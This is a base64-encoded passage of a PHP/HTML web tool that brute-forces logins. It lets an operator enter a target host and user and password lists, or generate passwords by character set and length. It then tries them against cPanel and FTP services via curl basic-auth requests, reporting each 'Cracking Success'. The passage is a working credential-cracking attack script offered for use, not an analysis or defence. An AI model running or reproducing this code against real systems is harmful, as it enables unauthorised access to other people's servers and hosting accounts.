b2xvcjogIzAwMDAwMDsgY29sb3I6I0MwQzBDMCI+PD9waHAgZWNobyAkcGFzcyA/PjwvdGV4dGFy
ZWE+PGJyPgogICAgICAgIDxicj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8Zm9u
dCBzdHlsZT0iZm9udC13ZWlnaHQ6NzAwIiBzaXplPSIyIiBmYWNlPSJUYWhvbWEiIGNvbG9yPSIj
MDA4MDAwIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
PHNwYW4gbGFuZz0iYXItc2EiPkd1ZXNzIG9wdGlvbnM8L3NwYW4+PC9mb250Pjxmb250IHN0eWxl
PSJmb250LXNpemU6IDEycHQ7IiBzaXplPSItMyIgZmFjZT0iVmVyZGFuYSI+PHNwYW4gc3R5bGU9
ImZvbnQtc2l6ZTogOXB0OyI+Jm5ic3A7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgIDxmb250IGZhY2U9IlRhaG9tYSI+CiAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCBuYW1lPSJjcmFja3R5cGUiIHZhbHVl
PSJjcGFuZWwiIHN0eWxlPSJmb250LXdlaWdodDogNzAwOyIgY2hlY2tlZCB0eXBlPSJyYWRpbyI+
PC9mb250Pjwvc3Bhbj48L2ZvbnQ+PGI+PGZvbnQgc2l6ZT0iMiIgZmFjZT0iVGFob21hIj4KICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ3BhbmVsPC9mb250
Pjxmb250IHNpemU9IjIiIGNvbG9yPSIjY2MwMDAwIiBmYWNlPSJUYWhvbWEiPgogICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2ZvbnQ+PGZvbnQgc2l6ZT0i
MiIgY29sb3I9IiNGRkZGRkYiIGZhY2U9IlRhaG9tYSI+CiAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICgyMDgyKTwvZm9udD48L2I+PGZvbnQgc2l6ZT0iMiIg
ZmFjZT0iVGFob21hIj48Yj4gPC9iPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICA8L2ZvbnQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgIDxmb250IHN0eWxlPSJmb250LXNpemU6IDEycHQ7IiBzaXplPSItMyIgZmFj
ZT0iVmVyZGFuYSI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgIDxzcGFuIHN0eWxlPSJmb250LXNpemU6IDlwdDsiPjxmb250IGZhY2U9IlRhaG9tYSI+CgkJ
CQkJCQkJCQkJCTxpbnB1dCBuYW1lPSJjcmFja3R5cGUiIHZhbHVlPSJjcGFuZWwyIiBzdHlsZT0i
Zm9udC13ZWlnaHQ6IDcwMDsiIHR5cGU9InJhZGlvIj48L2ZvbnQ+PC9zcGFuPjwvZm9udD48Yj48
Zm9udCBzaXplPSIyIiBmYWNlPSJUYWhvbWEiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICBUZWxuZXQ8L2ZvbnQ+PGZvbnQgc2l6ZT0iMiIgY29sb3I9IiNj
YzAwMDAiIGZhY2U9IlRhaG9tYSI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgIDwvZm9udD48Zm9udCBzaXplPSIyIiBjb2xvcj0iI0ZGRkZGRiIgZmFjZT0i
VGFob21hIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
KDIzKTwvZm9udD48L2I+PGZvbnQgc2l6ZT0iMiIgZmFjZT0iVGFob21hIj48Yj4gPC9iPgogICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2ZvbnQ+CiAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxmb250IHN0eWxlPSJm
b250LXNpemU6IDEycHQ7IiBzaXplPSItMyIgZmFjZT0iVmVyZGFuYSI+CiAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuIHN0eWxlPSJmb250LXNpemU6
IDlwdDsiPjxmb250IGZhY2U9IlRhaG9tYSI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgIDxpbnB1dCBuYW1lPSJjcmFja3R5cGUiIHZhbHVlPSJmdHAiIHN0
eWxlPSJmb250LXdlaWdodDogNzAwOyIgdHlwZT0icmFkaW8iPjwvZm9udD48L3NwYW4+PC9mb250
Pjxmb250IHN0eWxlPSJmb250LXdlaWdodDogNzAwOyIgc2l6ZT0iMiIgZmFjZT0iVGFob21hIj4K
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9mb250Pjxz
cGFuIHN0eWxlPSJmb250LXdlaWdodDogNzAwOyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgIDxmb250IHNpemU9IjIiIGZhY2U9IlRhaG9tYSI+RnRwIDwv
Zm9udD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGZv
bnQgc2l6ZT0iMiIgY29sb3I9IiNGRkZGRkYiIGZhY2U9IlRhaG9tYSI+CiAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICgyMSk8L2ZvbnQ+PC9zcGFuPgoJCQkJ
CQkJCQkJCQk8YnI+CgkJCQkJCQkJCQkJCTxmb250IHN0eWxlPSJmb250LXdlaWdodDo3MDAiIHNp
emU9IjIiIGZhY2U9IlRhaG9tYSIgY29sb3I9IiMwMDgwMDAiPjxzcGFuIGxhbmc9ImFyLXNhIj5U
aW1lb3V0IGRlbGF5PC9zcGFuPgoJCQkJCQkJCQkJCQk8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0i
Y29ubmVjdF90aW1lb3V0IiBzdHlsZT0iYm9yZGVyOiAycHggc29saWQgIzFEMUQxRDtiYWNrZ3Jv
dW5kOiBibGFjaztjb2xvcjpSRUQiIHNpemU9NDggdmFsdWU9Ijw/cGhwIGVjaG8gJGNvbm5lY3Rf
dGltZW91dDs/PiI+PC9pbnB1dD4KCQkJCQkJCQkJCQkJPGJyPgoJCQkJCQkJCQkJCQk8aW5wdXQg
dHlwZT0iY2hlY2tib3giIG5hbWU9ImJydXRlZm9yY2UiIHZhbHVlPSJ0cnVlIj48Zm9udCBzdHls
ZT0iZm9udC13ZWlnaHQ6NzAwIiBzaXplPSIyIiBmYWNlPSJUYWhvbWEiIGNvbG9yPSIjMDA4MDAw
Ij48c3BhbiBsYW5nPSJhci1zYSI+QnJ1dGVmb3JjZTwvc3Bhbj48L2lucHV0PgoJCQkJCQkJCQkJ
CQk8c2VsZWN0IG5hbWU9ImNoYXJzZXQiIHN0eWxlPSJib3JkZXI6IDJweCBzb2xpZCAjMUQxRDFE
O2JhY2tncm91bmQ6IGJsYWNrO2NvbG9yOlJFRCI+CgkJCQkJCQkJCQkJCSA8b3B0aW9uIHZhbHVl
PSJhbGwiPkFsbCBMZXR0ZXJzICsgTnVtYmVyczwvb3B0aW9uPgogCQkJCQkJCQkJCQkgICAgIDxv
cHRpb24gdmFsdWU9Im51bWVyaWMiPk51bWJlcnM8L29wdGlvbj4KCQkJCQkJCQkJCQkJIDxvcHRp
b24gdmFsdWU9ImxldHRlcnMiPkxldHRlcnM8L29wdGlvbj4KCQkJCQkJCQkJCQkJIDxvcHRpb24g
dmFsdWU9InN5bWJvbHMiPlN5bWJvbHM8L29wdGlvbj4KCQkJCQkJCQkJCQkJIDxvcHRpb24gdmFs
dWU9Imxvd2VyY2FzZSI+TG93ZXIgTGV0dGVyczwvb3B0aW9uPgoJCQkJCQkJCQkJCQkgPG9wdGlv
biB2YWx1ZT0idXBwZXJjYXNlIj5IaWdoZXIgTGV0dGVyczwvb3B0aW9uPgoJCQkJCQkJCQkJCQkg
PG9wdGlvbiB2YWx1ZT0ibG93ZXJudW1lcmljIj5Mb3dlciBMZXR0ZXJzICsgTnVtYmVyczwvb3B0
aW9uPgoJCQkJCQkJCQkJCQkgPG9wdGlvbiB2YWx1ZT0idXBwZXJudW1lcmljIj5VcHBlciBMZXR0
ZXJzICsgTnVtYmVyczwvb3B0aW9uPgoJCQkJCQkJCQkJCQkgPG9wdGlvbiB2YWx1ZT0ibG93ZXJz
eW1ib2xzIj5Mb3dlciBMZXR0ZXJzICsgU3ltYm9sczwvb3B0aW9uPgoJCQkJCQkJCQkJCQkgPG9w
dGlvbiB2YWx1ZT0idXBwZXJzeW1ib2xzIj5VcHBlciBMZXR0ZXJzICsgU3ltYm9sczwvb3B0aW9u
PgoJCQkJCQkJCQkJCQkgPG9wdGlvbiB2YWx1ZT0ibGV0dGVyc3N5bWJvbHMiPkFsbCBMZXR0ZXJz
ICsgU3ltYm9sczwvb3B0aW9uPgoJCQkJCQkJCQkJCQkgPG9wdGlvbiB2YWx1ZT0ibnVtYmVyc3N5
bWJvbHMiPk51bWJlcnMgKyBTeW1ib2xzPC9vcHRpb24+CgkJCQkJCQkJCQkJCSA8b3B0aW9uIHZh
bHVlPSJsb3dlcm51bWVyaWNzeW1ib2xzIj5Mb3dlciBMZXR0ZXJzICsgTnVtYmVycyArIFN5bWJv
bHM8L29wdGlvbj4KCQkJCQkJCQkJCQkJIDxvcHRpb24gdmFsdWU9InVwcGVybnVtZXJpY3N5bWJv
bHMiPlVwcGVyIExldHRlcnMgKyBOdW1iZXJzICsgU3ltYm9sczwvb3B0aW9uPgoJCQkJCQkJCQkJ
CQkgPG9wdGlvbiB2YWx1ZT0ibGV0dGVyc251bWVyaWNzeW1ib2xzIj5BbGwgTGV0dGVycyArIE51
bWJlcnMgKyBTeW1ib2xzPC9vcHRpb24+CgoJCQkJCQkJCQkJCQk8L3NlbGVjdD4KCQkJCQkJCQkJ
CQkJPGJyPgoJCQkJCQkJCQkJCQk8Zm9udCBzdHlsZT0iZm9udC13ZWlnaHQ6NzAwIiBzaXplPSIy
IiBmYWNlPSJUYWhvbWEiIGNvbG9yPSIjMDA4MDAwIj48c3BhbiBsYW5nPSJhci1zYSI+TWluIEJy
dXRlZm9yY2UgTGVuZ3RoOjwvc3Bhbj48L2ZvbnQ+CgkJCQkJCQkJCQkJCTxpbnB1dCB0eXBlPSJ0
ZXh0IiBuYW1lPSJtaW5fbGVuZ3RoIiBzdHlsZT0iYm9yZGVyOiAycHggc29saWQgIzFEMUQxRDti
YWNrZ3JvdW5kOiBibGFjaztjb2xvcjpSRUQiIHNpemU9NDggdmFsdWU9Ijw/cGhwIGVjaG8gJG1p
bl9sZW5ndGg7Pz4iPjwvaW5wdXQ+CgkJCQkJCQkJCQkJCTxicj4KCQkJCQkJCQkJCQkJPGZvbnQg
c3R5bGU9ImZvbnQtd2VpZ2h0OjcwMCIgc2l6ZT0iMiIgZmFjZT0iVGFob21hIiBjb2xvcj0iIzAw
ODAwMCI+PHNwYW4gbGFuZz0iYXItc2EiPk1heCBCcnV0ZWZvcmNlIExlbmd0aDo8L3NwYW4+PC9m
b250PgoJCQkJCQkJCQkJCQk8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0ibWF4X2xlbmd0aCIgc3R5
bGU9ImJvcmRlcjogMnB4IHNvbGlkICMxRDFEMUQ7YmFja2dyb3VuZDogYmxhY2s7Y29sb3I6UkVE
IiBzaXplPTQ4IHZhbHVlPSI8P3BocCBlY2hvICRtYXhfbGVuZ3RoOz8+Ij48L2lucHV0PgoJCQkJ
CQkJCQkJCQk8L3A+CiAgICAgICAgPHAgYWxpZ249ImNlbnRlciI+Jm5ic3A7Jm5ic3A7Jm5ic3A7
Jm5ic3A7CiAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkdvIiBuYW1lPSJzdWJt
aXQiIHN0eWxlPSJjb2xvcjogIzAwODAwMDsgZm9udC13ZWlnaHQ6IGJvbGQ7IGJvcmRlcjogMXB4
IHNvbGlkICMzMzMzMzM7IGJhY2tncm91bmQtY29sb3I6ICMwMDAwMDAiPjwvcD4KICAgICAgICAg
ICAgICAgICAgICAgICAgPC90ZD4KICAgICAgICAgICAgICAgIDwvdHI+CiAgICAgICAgPC90YWJs
ZT4KCiAgICA8cCBhbGlnbj0iY2VudGVyIj48L3RkPgogIDwvdHI+CiAgPC9mb3JtPgoKPD9waHAK
ZnVuY3Rpb24gYnJ1dGUoKQp7CglnbG9iYWwgJHZhbHMsJG1pbl9sZW5ndGgsJG1heF9sZW5ndGg7
CglnbG9iYWwgJHRhcmdldCwkcHVyZXVzZXIsJGNvbm5lY3RfdGltZW91dDsKCSRtaW49JG1pbl9s
ZW5ndGg7CgkkbWF4PSRtYXhfbGVuZ3RoOwoJJEEgPSBhcnJheSgpOwoJJG51bVZhbHMgPSBjb3Vu
dCgkdmFscyk7CgkkaW5jRG9uZSA9ICIiOwoJJHJlYWxNYXggPSAiIjsKCSRjdXJyZW50VmFsID0g
IiI7CgkkZmlyc3RWYWwgPSAiIjsKCWZvciAoJGkgPSAwOyAkaSA8ICgkbWF4ICsgMSk7ICRpKysp
IHsKCQkkQVskaV0gPSAtMTsKCX0KCQoJZm9yICgkaSA9IDA7ICRpIDwgJG1heDsgJGkrKykgewoJ
CSRyZWFsTWF4ID0gJHJlYWxNYXggLiAkdmFsc1skbnVtVmFscyAtIDFdOwoJfQoJZm9yICgkaSA9
IDA7ICRpIDwgJG1pbjsgJGkrKykgewoJCSRBWyRpXSA9ICR2YWxzWzBdOwoJfQoJJGkgPSAwOwoJ
d2hpbGUgKCRBWyRpXSAhPSAtMSkgewoJCSRmaXJzdFZhbCAuPSAkQVskaV07CgkJJGkrKzsKCX0K
CS8vZWNobyAkZmlyc3RWYWwgLiAiPGJyPiI7CgljcGFuZWxfY2hlY2soJHRhcmdldCwkcHVyZXVz
ZXIsJGZpcnN0VmFsLCRjb25uZWN0X3RpbWVvdXQpOwoJCgl3aGlsZSAoMSkgewoJCWZvciAoJGkg
PSAwOyAkaSA8ICgkbWF4ICsgMSk7ICRpKyspIHsKCQkJaWYgKCRBWyRpXSA9PSAtMSkgewoJCQkJ
YnJlYWs7CgkJCX0KCQl9CgkJJGktLTsKCQkkaW5jRG9uZSA9IDA7CgkJd2hpbGUgKCEkaW5jRG9u
ZSkgewkKCQkJZm9yICgkaiA9IDA7ICRqIDwgJG51bVZhbHM7ICRqKyspIHsKCQkJCWlmICgkQVsk
aV0gPT0gJHZhbHNbJGpdKSB7CgkJCQkJYnJlYWs7CgkJCQl9CgkJCX0KCQkJaWYgKCRqID09ICgk
bnVtVmFscyAtIDEpKSB7CgkJCQkkQVskaV0gPSAkdmFsc1swXTsKCQkJCSRpLS07CgkJCQlpZiAo
JGkgPCAwKSB7CgkJCQkJZm9yICgkaSA9IDA7ICRpIDwgKCRtYXggKyAxKTsgJGkrKykgewoJCQkJ
CQlpZiAoJEFbJGldID09IC0xKSB7CgkJCQkJCQlicmVhazsKCQkJCQkJfQoJCQkJCX0KCQkJCQkk
QVskaV0gPSAkdmFsc1swXTsKCQkJCQkkQVskaSArIDFdID0gLTE7CgkJCQkJJGluY0RvbmUgPSAx
OwoJCQkJCXByaW50ICJTdGFydGluZyAiIC4gKHN0cmxlbigkY3VycmVudFZhbCkgKyAxKSAuICIg
Q2hhcmFjdGVycyBDcmFja2luZzxicj4iOwoJCQkJfQoJCQl9IGVsc2UgewoJCQkJJEFbJGldID0g
JHZhbHNbJGogKyAxXTsKCQkJCSRpbmNEb25lID0gMTsKCQkJfQoJCX0KCQkkaSA9IDA7CgkJJGN1
cnJlbnRWYWwgPSAiIjsKCQl3aGlsZSAoJEFbJGldICE9IC0xKSB7CgkJCSRjdXJyZW50VmFsID0g
JGN1cnJlbnRWYWwgLiAkQVskaV07CgkJCSRpKys7CgkJfQoJCWNwYW5lbF9jaGVjaygkdGFyZ2V0
LCRwdXJldXNlciwkY3VycmVudFZhbCwkY29ubmVjdF90aW1lb3V0KTsKCQkvL2VjaG8gJGN1cnJl
bnRWYWwgLiAiPGJyPiI7CgkJaWYgKCRjdXJyZW50VmFsID09ICRyZWFsTWF4KSB7CgkJCXJldHVy
biAwOwoJCX0KCX0KfQpmdW5jdGlvbiBnZXRtaWNyb3RpbWUoKSB7CiAgIGxpc3QoJHVzZWMsICRz
ZWMpID0gZXhwbG9kZSgiICIsbWljcm90aW1lKCkpOwogICByZXR1cm4gKChmbG9hdCkkdXNlYyAr
IChmbG9hdCkkc2VjKTsKfSAKCmZ1bmN0aW9uIGZ0cF9jaGVjaygkaG9zdCwkdXNlciwkcGFzcywk
dGltZW91dCkKewogJGNoID0gY3VybF9pbml0KCk7CiBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRf
VVJMLCAiZnRwOi8vJGhvc3QiKTsKIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFO
U0ZFUiwgMSk7CiBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSFRUUEFVVEgsIENVUkxBVVRIX0JB
U0lDKTsKIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GVFBMSVNUT05MWSwgMSk7CiBjdXJsX3Nl
dG9wdCgkY2gsIENVUkxPUFRfVVNFUlBXRCwgIiR1c2VyOiRwYXNzIik7CiBjdXJsX3NldG9wdCAo
JGNoLCBDVVJMT1BUX0NPTk5FQ1RUSU1FT1VULCAkdGltZW91dCk7CiBjdXJsX3NldG9wdCgkY2gs
IENVUkxPUFRfRkFJTE9ORVJST1IsIDEpOwogJGRhdGEgPSBjdXJsX2V4ZWMoJGNoKTsKIGlmICgg
Y3VybF9lcnJubygkY2gpID09IDI4ICkKIHsKIHByaW50ICI8Yj48Zm9udCBmYWNlPVwiVmVyZGFu
YVwiIHN0eWxlPVwiZm9udC1zaXplOiA5cHRcIj4KIDxmb250IGNvbG9yPVwiI0FBMDAwMFwiPkVy
cm9yIDo8L2ZvbnQ+IDxmb250IGNvbG9yPVwiIzAwODAwMFwiPkNvbm5lY3Rpb24gVGltZW91dAog
UGxlYXNlIENoZWNrIFRoZSBUYXJnZXQgSG9zdG5hbWUgLjwvZm9udD48L2ZvbnQ+PC9iPjwvcD4i
O2V4aXQ7CiB9CiBlbHNlIGlmICggY3VybF9lcnJubygkY2gpID09IDAgKQogewogIHByaW50ICI8
Yj48Zm9udCBmYWNlPVwiVGFob21hXCIgc3R5bGU9XCJmb250LXNpemU6IDlwdFwiIGNvbG9yPVwi
IzAwODAwMFwiPlt+XTwvZm9udD48L2I+PGZvbnQgZmFjZT1cIlRhaG9tYVwiICAgc3R5bGU9XCJm
b250LXNpemU6IDlwdFwiPjxiPjxmb250IGNvbG9yPVwiIzAwODAwMFwiPgogQ3JhY2tpbmcgU3Vj
Y2VzcyBXaXRoIFVzZXJuYW1lICZxdW90OzwvZm9udD48Zm9udCBjb2xvcj1cIiNGRjAwMDBcIj4k
dXNlcjwvZm9udD48Zm9udCBjb2xvcj1cIiMwMDgwMDBcIj5cIgogYW5kIFBhc3N3b3JkIFwiPC9m
b250Pjxmb250IGNvbG9yPVwiI0ZGMDAwMFwiPiRwYXNzPC9mb250Pjxmb250IGNvbG9yPVwiIzAw
ODAwMFwiPlwiPC9mb250PjwvYj48YnI+PGJyPiI7CiB9CiBjdXJsX2Nsb3NlKCRjaCk7Cn0KZnVu
Y3Rpb24gY3BhbmVsX2NoZWNrKCRob3N0LCR1c2VyLCRwYXNzLCR0aW1lb3V0KQp7CiBnbG9iYWwg
JGNwYW5lbF9wb3J0OwogJGNoID0gY3VybF9pbml0KCk7CiAvL2VjaG8gImh0dHA6Ly8kaG9zdDoi
LiRjcGFuZWxfcG9ydC4iICR1c2VyICRwYXNzPGJyPiI7CiBjdXJsX3NldG9wdCgkY2gsIENVUkxP
UFRfVVJMLCAiaHR0cDovLyRob3N0OiIgLiAkY3BhbmVsX3BvcnQpOwogY3VybF9zZXRvcHQoJGNo
LCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsKIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9I
VFRQQVVUSCwgQ1VSTEFVVEhfQkFTSUMpOwogY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VTRVJQ
V0QsICIkdXNlcjokcGFzcyIpOwogY3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9DT05ORUNUVElN
RU9VVCwgJHRpbWVvdXQpOwogY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZBSUxPTkVSUk9SLCAx
KTsKICRkYXRhID0gY3VybF9leGVjKCRjaCk7CiBpZiAoIGN1cmxfZXJybm8oJGNoKSA9PSAyOCAp
CiB7CiAgcHJpbnQgIjxiPjxmb250IGZhY2U9XCJWZXJkYW5hXCIgc3R5bGU9XCJmb250LXNpemU6
IDlwdFwiPgogIDxmb250IGNvbG9yPVwiI0FBMDAwMFwiPkVycm9yIDo8L2ZvbnQ+IDxmb250IGNv
bG9yPVwiIzAwODAwMFwiPkNvbm5lY3Rpb24gVGltZW91dAogIFBsZWFzZSBDaGVjayBUaGUgVGFy
Z2V0IEhvc3RuYW1lIC48L2ZvbnQ+PC9mb250PjwvYj48L3A+IjtleGl0OwogfQogZWxzZSBpZiAo
IGN1cmxfZXJybm8oJGNoKSA9PSAwICkKIHsKICBwcmludCAiPGI+PGZvbnQgZmFjZT1cIlRhaG9t
YVwiIHN0eWxlPVwiZm9udC1zaXplOiA5cHRcIiBjb2xvcj1cIiMwMDgwMDBcIj5bfl08L2ZvbnQ+
PC9iPjxmb250IGZhY2U9XCJUYWhvbWFcIiAgIHN0eWxlPVwiZm9udC1zaXplOiA5cHRcIj48Yj48
Zm9udCBjb2xvcj1cIiMwMDgwMDBcIj4gCiAgQ3JhY2tpbmcgU3VjY2VzcyBXaXRoIFVzZXJuYW1l
ICZxdW90OzwvZm9udD48Zm9udCBjb2xvcj1cIiNGRjAwMDBcIj4kdXNlcjwvZm9udD48Zm9udCBj
b2xvcj1cIiMwMDgwMDBcIj5cIgogIGFuZCBQYXNzd29yZCBcIjwvZm9udD48Zm9udCBjb2xvcj1c
IiNGRjAwMDBcIj4kcGFzczwvZm9udD48Zm9udCBjb2xvcj1cIiMwMDgwMDBcIj5cIjwvZm9udD48
L2I+PGJyPjxicj4iOwogfQogY3VybF9jbG9zZSgkY2gpOwp9CgokdGltZV9zdGFydCA9IGdldG1p
Y3JvdGltZSgpOwoKaWYoaXNzZXQoJHN1Ym1pdCkgJiYgIWVtcHR5KCRzdWJtaXQpKQp7CiBpZihl
bXB0eSgkdXNlcnMpICYmIGVtcHR5KCRwYXNzKSApCiB7CiAgIHByaW50ICI8cD48Zm9udCBmYWNl
PVwiVGFob21hXCIgc2l6ZT1cIjJcIj48Yj48Zm9udCBjb2xvcj1cIiNGRjAwMDBcIj5FcnJvciA6
IDwvZm9udD5QbGVhc2UgQ2hlY2sgVGhlIFVzZXJzIG9yIFBhc3N3b3JkIExpc3QgRW50cnkgLiAu
IC48L2I+PC9mb250PjwvcD4iOyBleGl0OyB9CiBpZihlbXB0eSgkdXNlcnMpKXsgcHJpbnQgIjxw
Pjxmb250IGZhY2U9J1RhaG9tYScgc2l6ZT0nMic+PGI+PGZvbnQgY29sb3I9JyNGRjAwMDAnPkVy
cm9yIDogPC9mb250PlBsZWFzZSBDaGVjayBUaGUgVXNlcnMgTGlzdCBFbnRyeSAuIC4gLjwvYj48
L2ZvbnQ+PC9wPiI7IGV4aXQ7IH0KIGlmKGVtcHR5KCRwYXNzKSAmJiAkX1JFUVVFU1RbJ2JydXRl
Zm9yY2UnXSE9InRydWUiICl7IHByaW50ICI8cD48Zm9udCBmYWNlPSdUYWhvbWEnIHNpemU9JzIn
PjxiPjxmb250IGNvbG9yPScjRkYwMDAwJz5FcnJvciA6IDwvZm9udD5QbGVhc2UgQ2hlY2sgVGhl
IFBhc3N3b3JkIExpc3QgRW50cnkgLiAuIC48L2I+PC9mb250PjwvcD4iOyBleGl0OyB9OwogJHVz
ZXJsaXN0PWV4cGxvZGUoIlxuIiwkdXNlcnMpOwogJHBhc3NsaXN0PWV4cGxvZGUoIlxuIiwkcGFz
cyk7CiBwcmludCAiPGI+PGZvbnQgZmFjZT1cIlRhaG9tYVwiIHN0eWxlPVwiZm9udC1zaXplOiA5
cHRcIiBjb2xvcj1cIiMwMDgwMDBcIj5bfl0jPC9mb250Pjxmb250IGZhY2U9XCJUYWhvbWFcIiBz
dHlsZT1cImZvbnQtc2l6ZTogOXB0XCIgY29sb3I9XCIjRkYwMDAwXCI+CiBDcmFja2luZyBQcm9j
ZXNzIFN0YXJ0ZWQsIFBsZWFzZSBXYWl0IC4uLjwvZm9udD48L2I+PGJyPjxicj4iOwoKIGlmKGlz
c2V0KCRfUE9TVFsnY29ubmVjdF90aW1lb3V0J10pKQogewogICRjb25uZWN0X3RpbWVvdXQ9JF9Q
T1NUWydjb25uZWN0X3RpbWVvdXQnXTsKIH0KCiBpZigkY3JhY2t0eXBlID09ICJmdHAiKQogewog
IGZvcmVhY2ggKCR1c2VybGlzdCBhcyAkdXNlcikgCiAgewogICAkcHVyZXVzZXIgPSB0cmltKCR1
c2VyKTsKICAgZm9yZWFjaCAoJHBhc3NsaXN0IGFzICRwYXNzd29yZCApIAogICB7CiAgICAgJHB1
cmVwYXNzID0gdHJpbSgkcGFzc3dvcmQpOwogICAgIGZ0cF9jaGVjaygkdGFyZ2V0LCRwdXJldXNl
ciwkcHVyZXBhc3MsJGNvbm5lY3RfdGltZW91dCk7CiAgIH0KICB9CiB9CiAKIGlmICgkY3JhY2t0
eXBlID09ICJjcGFuZWwiIHx8ICRjcmFja3R5cGUgPT0gImNwYW5lbDIiKQogewogIGlmKCRjcmFj
a3R5cGUgPT0gImNwYW5lbDIiKQogIHsKICAgJGNwYW5lbF9wb3J0PSIyMyI7CiAgfQogIGVsc2UK
ICAgJGNwYW5lbF9wb3J0PSIyMDgyIjsKICAKICBmb3JlYWNoICgkdXNlcmxpc3QgYXMgJHVzZXIp
IAogIHsKICAgJHB1cmV1c2VyID0gdHJpbSgkdXNlcik7CiAgIHByaW50ICI8Yj48Zm9udCBmYWNl
PVwiVGFob21hXCIgc3R5bGU9XCJmb250LXNpemU6IDlwdFwiIGNvbG9yPVwiIzAwODAwMFwiPlt+
XSM8L2ZvbnQ+PGZvbnQgZmFjZT1cIlRhaG9tYVwiICBzdHlsZT1cImZvbnQtc2l6ZTogOXB0XCIg
Y29sb3I9XCIjRkYwODAwXCI+CiAgIFByb2Nlc3NpbmcgdXNlciAkcHVyZXVzZXIgLi4uIDwvZm9u
dD48L2I+IjsKICAgaWYoJF9QT1NUWydicnV0ZWZvcmNlJ109PSJ0cnVlIikKICAgewogICAgZWNo
byAiIGJydXRlZm9yY2luZyAuLiI7CgllY2hvICI8YnI+IjsKCWJydXRlKCk7CiAgIH0KICAgZWxz
ZQogICB7CgkgZWNobyAiPGJyPiI7IAoJIGZvcmVhY2ggKCRwYXNzbGlzdCBhcyAkcGFzc3dvcmQg
KSAKICAgICB7CiAgICAgICAkcHVyZXBhc3MgPSB0cmltKCRwYXNzd29yZCk7CiAgICAgICBjcGFu
ZWxfY2hlY2soJHRhcmdldCwkcHVyZXVzZXIsJHB1cmVwYXNzLCRjb25uZWN0X3RpbWVvdXQpOwog
ICAgIH0KICAgfQogIH0KICAkdGltZV9lbmQgPSBnZXRtaWNyb3RpbWUoKTsKJHRpbWUgPSAkdGlt
ZV9lbmQgLSAkdGltZV9zdGFydDsgCiBwcmludCAiPGI+PGZvbnQgZmFjZT1cIlRhaG9tYVwiIHN0
eWxlPVwiZm9udC1zaXplOiA5cHRcIiBjb2xvcj1cIiMwMDgwMDBcIj5bfl0jPC9mb250Pjxmb250
IGZhY2U9XCJUYWhvbWFcIiBzdHlsZT1cImZvbnQtc2l6ZTogOXB0XCIgY29sb3I9XCIjRkYwMDAw
XCI+CiBDcmFja2luZyBGaW5pc2hlZC4gRWxhcHNlZCB0aW1lOiAkdGltZTwvZm9udD4gc2Vjb25k
czwvYj48YnI+PGJyPiI7CiAgfQp9CgoKCj8+Cgo8cCBhbGlnbj0iY2VudGVyIj48Yj48YSBocmVm
PSJodHRwOi8vd3d3LmFsbTNyZWZoLmNvbS92YiI+CjxzcGFuIHN0eWxlPSJ0ZXh0LWRlY29yYXRp
b246IG5vbmUiPlN1bm5pPC9zcGFuPjwvYT48L2I+PC9wPgoKICAgICAgPGZvcm0gc3R5bGU9ImJv
cmRlcjogMHB4IHJpZGdlICNGRkZGRkYiPgoKCgoKICAgIDxwIGFsaWduPSJjZW50ZXIiPjwvdGQ+
CiAgPC90cj48ZGl2IGFsaWduPSJjZW50ZXIiPgoKICAgICAgICAgICAgICAgIDx0cj4KCjwvZm9y
bT4KCgo8ZGl2IGFsaWduPSJjZW50ZXIiPgogPHRhYmxlIGJvcmRlcj0iMSIgd2lkdGg9IjEwJSIg
Ym9yZGVyY29sb3JsaWdodD0iIzAwODAwMCIgYm9yZGVyY29sb3JkYXJrPSIjMDA2QTAwIiBoZWln
aHQ9IjEwMCIgY2VsbHNwYWNpbmc9IjEiPgo8dHI+Cjx0ZCBib3JkZXJjb2xvcmxpZ2h0PSIjMDA4
